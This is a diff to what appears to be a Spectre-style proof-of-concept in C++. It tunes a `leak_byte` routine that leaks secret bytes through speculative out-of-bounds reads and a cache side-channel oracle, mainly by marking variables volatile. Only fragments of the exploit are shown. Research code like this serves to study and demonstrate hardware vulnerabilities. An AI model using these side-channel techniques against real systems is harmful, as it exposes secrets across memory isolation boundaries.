@@ -25,7 +25,6 @@
 #include "cache_sidechannel.h"
 #include "instr.h"
 
-// TODO(asteinha) Make this work with ICC.
 // TODO(asteinha) Implement support for MSVC and Windows.
 // TODO(asteinha) Investigate the exploitability of PowerPC.
 
@@ -82,13 +81,16 @@ static char leak_byte(const char *data, size_t offset) {
   CacheSideChannel sidechannel;
   const std::array<BigByte, 256> &isolated_oracle = sidechannel.GetOracle();
 
-  for (int run = 0;; ++run) {
+  // This is volatile along with other local variable that are not used in the
+  // "speculation" call so that we save registers and avoid spillage before the
+  // "speculation" call.
+  for (volatile int run = 0;; ++run) {
     sidechannel.FlushOracle();
 
     // We pick a different offset every time so that it's guaranteed that the
     // value of the in-bounds access is usually different from the secret value
     // we want to leak via out-of-bounds speculative access.
-    size_t safe_offset = run % strlen(data);
+    volatile size_t safe_offset = run % strlen(data);
     ForceRead(&isolated_oracle[static_cast<size_t>(data[safe_offset])]);
 
     // Backup all registers and mark the end of the context backup with the
@@ -139,7 +141,7 @@ static char leak_byte(const char *data, size_t offset) {
 #endif
         "RESTORE_REGISTERS\n");
 
-    std::pair<bool, char> result =
+    volatile std::pair<bool, char> result =
         sidechannel.RecomputeScores(data[safe_offset]);
     if (result.first) {
       return result.second;
